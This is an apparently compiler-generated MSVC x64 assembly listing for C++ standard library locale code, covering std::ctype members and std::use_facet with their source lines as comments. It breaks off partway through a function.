; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_is@?$ctype@_W@std@@MEBAPEB_WPEB_W0PEAF@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
_Dest$ = 72
?do_is@?$ctype@_W@std@@MEBAPEB_WPEB_W0PEAF@Z PROC	; std::ctype<wchar_t>::do_is, COMDAT

; 2896 :         mask* _Dest) const { // get mask sequence for elements in [_First, _Last)

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2897 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEB_WPEB_W@std@@YAXAEBQEB_W0@Z ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>

; 2898 :         return _CSTD _Getwctypes(_First, _Last, _Dest, &_Ctype);

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	mov	r9, rax
	mov	r8, QWORD PTR _Dest$[rsp]
	mov	rdx, QWORD PTR _Last$[rsp]
	mov	rcx, QWORD PTR _First$[rsp]
	call	_Getwctypes

; 2899 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_is@?$ctype@_W@std@@MEBAPEB_WPEB_W0PEAF@Z ENDP	; std::ctype<wchar_t>::do_is
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_is@?$ctype@_W@std@@MEBA_NF_W@Z
_TEXT	SEGMENT
tv72 = 32
this$ = 64
_Maskval$ = 72
_Ch$ = 80
?do_is@?$ctype@_W@std@@MEBA_NF_W@Z PROC			; std::ctype<wchar_t>::do_is, COMDAT

; 2891 :         mask _Maskval, _Elem _Ch) const { // test if element fits any mask classifications

$LN5:
	mov	WORD PTR [rsp+24], r8w
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 2892 :         return (_CSTD _Getwctype(_Ch, &_Ctype) & _Maskval) != 0;

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	mov	rdx, rax
	movzx	ecx, WORD PTR _Ch$[rsp]
	call	_Getwctype
	cwde
	movsx	ecx, WORD PTR _Maskval$[rsp]
	and	eax, ecx
	test	eax, eax
	je	SHORT $LN3@do_is
	mov	DWORD PTR tv72[rsp], 1
	jmp	SHORT $LN4@do_is
$LN3@do_is:
	mov	DWORD PTR tv72[rsp], 0
$LN4@do_is:
	movzx	eax, BYTE PTR tv72[rsp]

; 2893 :     }

	add	rsp, 56					; 00000038H
	ret	0
?do_is@?$ctype@_W@std@@MEBA_NF_W@Z ENDP			; std::ctype<wchar_t>::do_is
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Init@?$ctype@_W@std@@IEAAXAEBV_Locinfo@2@@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 64
__$ArrayPad$ = 112
this$ = 160
_Lobj$ = 168
?_Init@?$ctype@_W@std@@IEAAXAEBV_Locinfo@2@@Z PROC	; std::ctype<wchar_t>::_Init, COMDAT

; 2885 :     void __CLR_OR_THIS_CALL _Init(const _Locinfo& _Lobj) { // initialize from _Lobj

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 136				; 00000088H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 2886 :         _Ctype = _Lobj._Getctype();

	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, QWORD PTR _Lobj$[rsp]
	call	?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ ; std::_Locinfo::_Getctype
	mov	rcx, QWORD PTR this$[rsp]
	lea	rdi, QWORD PTR [rcx+16]
	mov	rsi, rax
	mov	ecx, 32					; 00000020H
	rep movsb

; 2887 :         _Cvt   = _Lobj._Getcvt();

	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, QWORD PTR _Lobj$[rsp]
	call	?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ ; std::_Locinfo::_Getcvt
	mov	rcx, QWORD PTR this$[rsp]
	lea	rdi, QWORD PTR [rcx+48]
	mov	rsi, rax
	mov	ecx, 44					; 0000002cH
	rep movsb

; 2888 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 136				; 00000088H
	pop	rdi
	pop	rsi
	ret	0
?_Init@?$ctype@_W@std@@IEAAXAEBV_Locinfo@2@@Z ENDP	; std::ctype<wchar_t>::_Init
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??1?$ctype@_W@std@@MEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$ctype@_W@std@@MEAA@XZ PROC				; std::ctype<wchar_t>::~ctype<wchar_t>, COMDAT

; 2877 :     __CLR_OR_THIS_CALL ~ctype() noexcept override {

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7?$ctype@_W@std@@6B@
	mov	QWORD PTR [rax], rcx

; 2878 :         if (_Ctype._Delfl) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	DWORD PTR [rax+32], 0
	je	SHORT $LN2@ctype

; 2879 :             _CSTD free(const_cast<short*>(_Ctype._Table));

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+24]
	call	free
$LN2@ctype:

; 2880 :         }
; 2881 : 
; 2882 :         _CSTD free(_Ctype._LocaleName);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+40]
	call	free

; 2883 :     }

	mov	rcx, QWORD PTR this$[rsp]
	call	??1ctype_base@std@@UEAA@XZ		; std::ctype_base::~ctype_base
	add	rsp, 40					; 00000028H
	ret	0
??1?$ctype@_W@std@@MEAA@XZ ENDP				; std::ctype<wchar_t>::~ctype<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 40
tv89 = 48
tv131 = 56
tv128 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z PROC ; std::ctype<wchar_t>::_Getcat, COMDAT

; 2868 :     static size_t __CLRCALL_OR_CDECL _Getcat(const locale::facet** _Ppf = nullptr, const locale* _Ploc = nullptr) {

$LN10:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 200				; 000000c8H
	mov	DWORD PTR $T1[rsp], 0

; 2869 :         if (_Ppf && !*_Ppf) {

	cmp	QWORD PTR _Ppf$[rsp], 0
	je	$LN2@Getcat
	mov	rax, QWORD PTR _Ppf$[rsp]
	cmp	QWORD PTR [rax], 0
	jne	$LN2@Getcat

; 2870 :             *_Ppf = new ctype<_Elem>(_Locinfo(_Ploc->c_str()));

	mov	ecx, 96					; 00000060H
	call	??2@YAPEAX_K@Z				; operator new
	mov	QWORD PTR $T2[rsp], rax
	cmp	QWORD PTR $T2[rsp], 0
	je	SHORT $LN4@Getcat
	mov	rcx, QWORD PTR _Ploc$[rsp]
	call	?c_str@locale@std@@QEBAPEBDXZ		; std::locale::c_str
	mov	rdx, rax
	lea	rcx, QWORD PTR $T4[rsp]
	call	??0_Locinfo@std@@QEAA@PEBD@Z		; std::_Locinfo::_Locinfo
	mov	QWORD PTR tv131[rsp], rax
	mov	rax, QWORD PTR tv131[rsp]
	mov	QWORD PTR tv128[rsp], rax
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	xor	r8d, r8d
	mov	rdx, QWORD PTR tv128[rsp]
	mov	rcx, QWORD PTR $T2[rsp]
	call	??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z ; std::ctype<wchar_t>::ctype<wchar_t>
	mov	QWORD PTR tv89[rsp], rax
	jmp	SHORT $LN5@Getcat
$LN4@Getcat:
	mov	QWORD PTR tv89[rsp], 0
$LN5@Getcat:
	mov	rax, QWORD PTR tv89[rsp]
	mov	QWORD PTR $T3[rsp], rax
	mov	rax, QWORD PTR _Ppf$[rsp]
	mov	rcx, QWORD PTR $T3[rsp]
	mov	QWORD PTR [rax], rcx
	mov	eax, DWORD PTR $T1[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@Getcat
	and	DWORD PTR $T1[rsp], -2
	lea	rcx, QWORD PTR $T4[rsp]
	call	??1_Locinfo@std@@QEAA@XZ		; std::_Locinfo::~_Locinfo
$LN2@Getcat:

; 2871 :         }
; 2872 : 
; 2873 :         return _X_CTYPE;

	mov	eax, 2

; 2874 :     }

	add	rsp, 200				; 000000c8H
	ret	0
?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ENDP ; std::ctype<wchar_t>::_Getcat
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
tv89 = 48
tv131 = 56
tv128 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?dtor$0@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA PROC ; `std::ctype<wchar_t>::_Getcat'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	edx, 96					; 00000060H
	mov	rcx, QWORD PTR $T2[rbp]
	call	??3@YAXPEAX_K@Z				; operator delete
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA ENDP ; `std::ctype<wchar_t>::_Getcat'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
tv89 = 48
tv131 = 56
tv128 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?dtor$1@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA PROC ; `std::ctype<wchar_t>::_Getcat'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	eax, DWORD PTR $T1[rbp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN8@dtor$1
	and	DWORD PTR $T1[rbp], -2
	lea	rcx, QWORD PTR $T4[rbp]
	call	??1_Locinfo@std@@QEAA@XZ		; std::_Locinfo::~_Locinfo
$LN8@dtor$1:
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA ENDP ; `std::ctype<wchar_t>::_Getcat'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z
_TEXT	SEGMENT
this$ = 48
_Lobj$ = 56
_Refs$ = 64
??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z PROC	; std::ctype<wchar_t>::ctype<wchar_t>, COMDAT

; 2864 :     __CLR_OR_THIS_CALL ctype(const _Locinfo& _Lobj, size_t _Refs = 0) : ctype_base(_Refs) {

$LN4:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR _Refs$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0ctype_base@std@@QEAA@_K@Z		; std::ctype_base::ctype_base
	npad	1
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7?$ctype@_W@std@@6B@
	mov	QWORD PTR [rax], rcx

; 2865 :         _Init(_Lobj);

	mov	rdx, QWORD PTR _Lobj$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Init@?$ctype@_W@std@@IEAAXAEBV_Locinfo@2@@Z ; std::ctype<wchar_t>::_Init
	npad	1

; 2866 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z ENDP	; std::ctype<wchar_t>::ctype<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Lobj$ = 56
_Refs$ = 64
?dtor$0@?0???0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA PROC ; `std::ctype<wchar_t>::ctype<wchar_t>'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1ctype_base@std@@UEAA@XZ		; std::ctype_base::~ctype_base
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA ENDP ; `std::ctype<wchar_t>::ctype<wchar_t>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?widen@?$ctype@_W@std@@QEBA_WD@Z
_TEXT	SEGMENT
this$ = 48
_Byte$ = 56
?widen@?$ctype@_W@std@@QEBA_WD@Z PROC			; std::ctype<wchar_t>::widen, COMDAT

; 2838 :     _Elem __CLR_OR_THIS_CALL widen(char _Byte) const { // widen char

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2839 :         return do_widen(_Byte);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movzx	edx, BYTE PTR _Byte$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+96]

; 2840 :     }

	add	rsp, 40					; 00000028H
	ret	0
?widen@?$ctype@_W@std@@QEBA_WD@Z ENDP			; std::ctype<wchar_t>::widen
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?is@?$ctype@_W@std@@QEBA_NF_W@Z
_TEXT	SEGMENT
this$ = 48
_Maskval$ = 56
_Ch$ = 64
?is@?$ctype@_W@std@@QEBA_NF_W@Z PROC			; std::ctype<wchar_t>::is, COMDAT

; 2801 :     bool __CLR_OR_THIS_CALL is(mask _Maskval, _Elem _Ch) const { // test if element fits any mask classifications

$LN3:
	mov	WORD PTR [rsp+24], r8w
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2802 :         return do_is(_Maskval, _Ch);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movzx	r8d, WORD PTR _Ch$[rsp]
	movzx	edx, WORD PTR _Maskval$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+32]

; 2803 :     }

	add	rsp, 40					; 00000028H
	ret	0
?is@?$ctype@_W@std@@QEBA_NF_W@Z ENDP			; std::ctype<wchar_t>::is
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Adl_verify_range@PEADPEBD@std@@YAXAEBQEADAEBQEBD@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
??$_Adl_verify_range@PEADPEBD@std@@YAXAEBQEADAEBQEBD@Z PROC ; std::_Adl_verify_range<char *,char const *>, COMDAT

; 1331 : constexpr void _Adl_verify_range(const _Iter& _First, const _Sentinel& _Last) {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 1332 :     // check that [_First, _Last) forms an iterator range
; 1333 :     if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1334 :         _Verify_range(_First, _Last);
; 1335 :     }
; 1336 : }

	ret	0
??$_Adl_verify_range@PEADPEBD@std@@YAXAEBQEADAEBQEBD@Z ENDP ; std::_Adl_verify_range<char *,char const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z
_TEXT	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z PROC ; std::use_facet<std::ctype<char> >, COMDAT

; 422  : const _Facet& __CRTDECL use_facet(const locale& _Loc) { // get facet reference from locale

$LN11:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 423  :     _BEGIN_LOCK(_LOCK_LOCALE) // the thread lock, make get atomic

	xor	edx, edx
	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??0_Lockit@std@@QEAA@H@Z		; std::_Lockit::_Lockit
	npad	1

; 424  :     const locale::facet* _Psave = _Facetptr<_Facet>::_Psave; // static pointer to lazy facet

	mov	rax, QWORD PTR ?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PEBVfacet@locale@2@EB ; std::_Facetptr<std::ctype<char> >::_Psave
	mov	QWORD PTR _Psave$2[rsp], rax

; 425  : 
; 426  :     const size_t _Id         = _Facet::id;

	lea	rcx, OFFSET FLAT:?id@?$ctype@D@std@@2V0locale@2@A ; std::ctype<char>::id
	call	??Bid@locale@std@@QEAA_KXZ		; std::locale::id::operator unsigned __int64
	mov	QWORD PTR _Id$6[rsp], rax

; 427  :     const locale::facet* _Pf = _Loc._Getfacet(_Id);

	mov	rdx, QWORD PTR _Id$6[rsp]
	mov	rcx, QWORD PTR _Loc$[rsp]
	call	?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z ; std::locale::_Getfacet
	mov	QWORD PTR _Pf$4[rsp], rax

; 428  : 
; 429  :     if (!_Pf) {

	cmp	QWORD PTR _Pf$4[rsp], 0
	jne	$LN2@use_facet

; 430  :         if (_Psave) {

	cmp	QWORD PTR _Psave$2[rsp], 0
	je	SHORT $LN3@use_facet

; 431  :             _Pf = _Psave; // lazy facet already allocated

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pf$4[rsp], rax
	jmp	SHORT $LN2@use_facet
$LN3@use_facet:

; 432  :         } else if (_Facet::_Getcat(&_Psave, &_Loc) == static_cast<size_t>(-1)) {

	mov	rdx, QWORD PTR _Loc$[rsp]
	lea	rcx, QWORD PTR _Psave$2[rsp]
	call	?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ; std::ctype<char>::_Getcat
	cmp	rax, -1
	jne	SHORT $LN5@use_facet

; 433  : #if _HAS_EXCEPTIONS
; 434  :             _Throw_bad_cast(); // lazy disallowed

	call	?_Throw_bad_cast@std@@YAXXZ		; std::_Throw_bad_cast
	npad	1

; 435  : #else // _HAS_EXCEPTIONS
; 436  :             _CSTD abort(); // lazy disallowed
; 437  : #endif // _HAS_EXCEPTIONS
; 438  :         } else { // queue up lazy facet for destruction

	jmp	SHORT $LN2@use_facet
$LN5@use_facet:

; 439  :             auto _Pfmod = const_cast<locale::facet*>(_Psave);

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pfmod$3[rsp], rax

; 440  :             unique_ptr<_Facet_base> _Psave_guard(static_cast<_Facet_base*>(_Pfmod));

	mov	rdx, QWORD PTR _Pfmod$3[rsp]
	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
	npad	1

; 441  : 
; 442  : #if defined(_M_CEE)
; 443  :             _Facet_Register_m(_Pfmod);
; 444  : #else // defined(_M_CEE)
; 445  :             _Facet_Register(_Pfmod);

	mov	rcx, QWORD PTR _Pfmod$3[rsp]
	call	?_Facet_Register@std@@YAXPEAV_Facet_base@1@@Z ; std::_Facet_Register

; 446  : #endif // defined(_M_CEE)
; 447  : 
; 448  :             _Pfmod->_Incref();

	mov	rax, QWORD PTR _Pfmod$3[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Pfmod$3[rsp]
	call	QWORD PTR [rax+8]

; 449  :             _Facetptr<_Facet>::_Psave = _Psave;

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR ?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PEBVfacet@locale@2@EB, rax ; std::_Facetptr<std::ctype<char> >::_Psave

; 450  :             _Pf                       = _Psave;

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pf$4[rsp], rax

; 451  : 
; 452  :             (void) _Psave_guard.release();

	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
	npad	1

; 453  :         }

	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
$LN2@use_facet:

; 454  :     }
; 455  : 
; 456  :     return static_cast<const _Facet&>(*_Pf); // should be dynamic_cast

	mov	rax, QWORD PTR _Pf$4[rsp]
	mov	QWORD PTR $T7[rsp], rax
	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	mov	rax, QWORD PTR $T7[rsp]

; 457  :     _END_LOCK()
; 458  : } // end of use_facet body

	add	rsp, 104				; 00000068H
	ret	0
$LN10@use_facet:
??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z ENDP ; std::use_facet<std::ctype<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
?dtor$0@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA PROC ; `std::use_facet<std::ctype<char> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Lock$1[rbp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA ENDP ; `std::use_facet<std::ctype<char> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
?dtor$1@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA PROC ; `std::use_facet<std::ctype<char> >'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Psave_guard$5[rbp]
	call	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA ENDP ; `std::use_facet<std::ctype<char> >'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G?$ctype@D@std@@MEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_G?$ctype@D@std@@MEAAPEAXI@Z PROC			; std::ctype<char>::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1?$ctype@D@std@@MEAA@XZ		; std::ctype<char>::~ctype<char>
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 48					; 00000030H
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_G?$ctype@D@std@@MEAAPEAXI@Z ENDP			; std::ctype<char>::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_narrow@?$ctype@D@std@@MEBAPEBDPEBD0DPEAD@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
__formal$ = 72
_Dest$ = 80
?do_narrow@?$ctype@D@std@@MEBAPEBDPEBD0DPEAD@Z PROC	; std::ctype<char>::do_narrow, COMDAT

; 2784 :         char* _Dest) const { // narrow elements in [_First, _Last) to chars

$LN3:
	mov	BYTE PTR [rsp+32], r9b
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2785 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEBDPEBD@std@@YAXAEBQEBD0@Z ; std::_Adl_verify_range<char const *,char const *>

; 2786 :         _CSTD memcpy(_Dest, _First, static_cast<size_t>(_Last - _First));

	mov	rax, QWORD PTR _First$[rsp]
	mov	rcx, QWORD PTR _Last$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	r8, rax
	mov	rdx, QWORD PTR _First$[rsp]
	mov	rcx, QWORD PTR _Dest$[rsp]
	call	memcpy

; 2787 :         return _Last;

	mov	rax, QWORD PTR _Last$[rsp]

; 2788 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_narrow@?$ctype@D@std@@MEBAPEBDPEBD0DPEAD@Z ENDP	; std::ctype<char>::do_narrow
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_narrow@?$ctype@D@std@@MEBADDD@Z
_TEXT	SEGMENT
this$ = 8
_Ch$ = 16
__formal$ = 24
?do_narrow@?$ctype@D@std@@MEBADDD@Z PROC		; std::ctype<char>::do_narrow, COMDAT

; 2779 :     virtual _Elem __CLR_OR_THIS_CALL do_narrow(_Elem _Ch, char) const { // narrow char

	mov	BYTE PTR [rsp+24], r8b
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx

; 2780 :         return _Ch;

	movzx	eax, BYTE PTR _Ch$[rsp]

; 2781 :     }

	ret	0
?do_narrow@?$ctype@D@std@@MEBADDD@Z ENDP		; std::ctype<char>::do_narrow
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_widen@?$ctype@D@std@@MEBAPEBDPEBD0PEAD@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
_Dest$ = 72
